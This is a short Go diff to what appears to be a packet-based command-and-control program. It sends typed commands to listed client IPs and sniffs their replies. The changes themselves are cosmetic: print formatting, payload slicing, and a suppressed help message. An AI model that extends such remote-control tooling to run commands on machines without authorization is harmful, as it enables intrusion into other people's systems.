@@ -188,9 +188,10 @@ func sniffer() {
 	}
 	source := gopacket.NewPacketSource(handler, handler.LinkType())
 	for packet := range source.Packets() {
-		payload := packet.ApplicationLayer().Payload()
+		payload := convert(packet.ApplicationLayer().Payload())
+
 		// fmt.Println(payload)
-		fmt.Println(convert(payload), "received from [IP]")
+		fmt.Print((payload[6:]), " received from [IP]")
 	}
 }
 
@@ -258,7 +259,7 @@ func main() {
 			ipaddr := strings.TrimRight(clients[clientid], "\r\n")
 			generate_packet(command, 0)
 			if DEBUG {
-				fmt.Println("[DEBUG]", command, "sent to", clients[clientid])
+				fmt.Print("[DEBUG] ", command, " sent to ", clients[clientid])
 			}
 			send_packets(ipaddr, *c)
 
@@ -270,7 +271,8 @@ func main() {
 			os.Exit(0)
 
 		} else {
-			fmt.Println("Type \"help\" for list of commands.")
+			// fmt.Println("Type \"help\" for list of commands.")
+			continue
 		}
 	}
 }
